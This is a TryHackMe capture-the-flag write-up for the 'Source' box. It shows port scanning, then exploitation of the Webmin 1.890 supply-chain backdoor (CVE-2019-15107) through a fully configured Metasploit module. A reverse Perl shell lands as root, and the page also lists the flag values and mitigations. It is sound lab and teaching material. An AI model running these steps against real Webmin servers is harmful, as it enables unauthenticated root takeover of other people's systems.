```
 ███████╗ ██████╗ ██╗   ██╗██████╗  ██████╗███████╗
 ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔════╝██╔════╝
 ███████╗██║   ██║██║   ██║██████╔╝██║     █████╗
 ╚════██║██║   ██║██║   ██║██╔══██╗██║     ██╔══╝
 ███████║╚██████╔╝╚██████╔╝██║  ██║╚██████╗███████╗
 ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
           TryHackMe — Source
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-11 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐☆☆☆

> ⏱️ ~6 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan — SSH (22), Webmin on port 10000
- [x] Confirmed no HTTP on port 80 — Feroxbuster failed to connect
- [x] Identified Webmin MiniServ 1.890 from Nmap version scan
- [x] Identified CVE-2019-15107 (Webmin backdoor) as the target exploit
- [x] Configured Metasploit `webmin_backdoor` module with SSL enabled
- [x] Shell landed directly as `root`
- [x] Retrieved user and root flags

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap — port scanning and version detection
- 🐉 Metasploit (`exploit/linux/http/webmin_backdoor`) — CVE-2019-15107 exploitation

---

## ⚡ TL;DR

Nmap fingerprinned Webmin 1.890 on port 10000. That version contains a supply-chain backdoor (CVE-2019-15107) introduced into the official download. Metasploit's `webmin_backdoor` module landed a root shell in one run — no credentials, no pivoting, no escalation needed.

---

## 📖 Introduction

Today's target is **Source** — a box whose flags spell out the lesson before you've even read them: `THM{SUPPLY_CHAIN_COMPROMISE}` and `THM{UPDATE_YOUR_INSTALL}`. Running Webmin 1.890, a version that had a backdoor secretly planted in its official tarball by an unknown attacker. Not a misconfig, not a weak password — someone tampered with the software at the source. The exploit requires no credentials and delivers root on first attempt. Sometimes the most dangerous vulnerability isn't in how you deployed the software. It's in what you deployed.

### Prerequisites

Readers are assumed to know:

- What a web administration panel like Webmin is
- What a supply-chain attack is and why it's particularly dangerous
- Basic Metasploit module configuration

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

*Full-range sweep with RustScan, Nmap for service and version fingerprinting:*

```bash
rustscan -a 10.48.182.62 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 10000/tcp | HTTP | **MiniServ 1.890 (Webmin httpd)** |

No port 80 — Feroxbuster and WhatWeb both confirmed connection refused. The entire attack surface is Webmin on port 10000, running over HTTPS. Nmap identifies the version as `MiniServ/1.890` directly from the server header — no guessing required.

**Webmin 1.890** is the exact version known to contain CVE-2019-15107, a backdoor introduced into the official download package. The version string in the scan output is the entire vulnerability assessment.

---

## 🚪 Foothold

*(~5 mins into the box)*

### CVE-2019-15107 — Webmin Supply-Chain Backdoor

**What happened?** In 2019, an unknown attacker compromised the build infrastructure used to produce Webmin's official download packages. A backdoor was secretly inserted into the `password_change.cgi` script: when a specific parameter is present in a request, it allows unauthenticated remote code execution as whatever user Webmin is running as — typically root. The backdoor affected versions 1.882 through 1.921 and was present in official packages hosted on SourceForge and the Webmin website for over a year before discovery.

This is a supply-chain attack: the software itself was weaponised at the source, meaning every admin who downloaded the official package from the official site received a compromised installation. Patching the server means nothing if the installer is already compromised.

*Loading the Metasploit module:*

```bash
msfconsole
msf > use exploit/linux/http/webmin_backdoor
```

*Configuring the module — `SSL true` is critical since Webmin serves HTTPS on 10000, not plain HTTP:*

```bash
msf exploit(linux/http/webmin_backdoor) > set RHOST 10.48.182.62
msf exploit(linux/http/webmin_backdoor) > set RPORT 10000
msf exploit(linux/http/webmin_backdoor) > set SSL true
msf exploit(linux/http/webmin_backdoor) > set LHOST 192.168.134.217
msf exploit(linux/http/webmin_backdoor) > set ForceExploit true
msf exploit(linux/http/webmin_backdoor) > run
```

```
# output
[*] Started reverse TCP handler on 192.168.134.217:4444
[+] The target is vulnerable. Exploitable: version 1.890 is vulnerable   # ^^^ confirmed
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (192.168.134.217:4444 -> 10.48.182.62:50938)
```

Shell landed. No credentials. No authentication bypass. The backdoor just opens the door.

---

## 🐚 Shell / Access

*Checking who we landed as:*

```bash
id
```

```
uid=0(root) gid=0(root) groups=0(root)
```

Straight to root — Webmin runs as root by design, so the backdoor inherits that. Metasploit's `shell` command upgraded the raw command execution to an interactive shell via Python.

*Collecting both flags in one shot:*

```bash
cat /root/root.txt
cat /home/dark/user.txt
```

```
THM{UPDATE_YOUR_INSTALL}
THM{SUPPLY_CHAIN_COMPROMISE}
```

The flags name the vulnerability class and the mitigation. The box is essentially a self-contained lesson statement.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `THM{SUPPLY_CHAIN_COMPROMISE}` | `/home/dark/user.txt` |
| Root | `THM{UPDATE_YOUR_INSTALL}` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Webmin 1.890 supply-chain backdoor (CVE-2019-15107) | Critical | Update to Webmin 1.930+; verify package integrity via checksum before installation; subscribe to vendor security advisories |
| Webmin exposed directly to the internet on port 10000 | High | Restrict Webmin to localhost or an internal network only; use a VPN or SSH tunnel for remote administration access |
| Webmin running as root | Medium | Run Webmin as a dedicated low-privilege service account where possible; principle of least privilege applies to admin panels too |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Supply-chain attacks are particularly insidious because they subvert trust at the source — downloading software from the official website is no longer sufficient if the build pipeline itself has been compromised. Verifying checksums, monitoring for unexpected version behaviour, and subscribing to vendor security advisories are non-negotiable hygiene for any software running with elevated privileges.

---

## 🔁 If I Did It Again

Skip `ForceExploit true` — Metasploit's built-in version check correctly identified 1.890 as vulnerable, so forcing was unnecessary. Also set `SSL true` before any other options so there's no risk of running the exploit against the wrong protocol and getting a confusing failure.

---

## 🔚 Changelog

*Last updated: 2026-06-11*

---

[↑ Back to top](#)
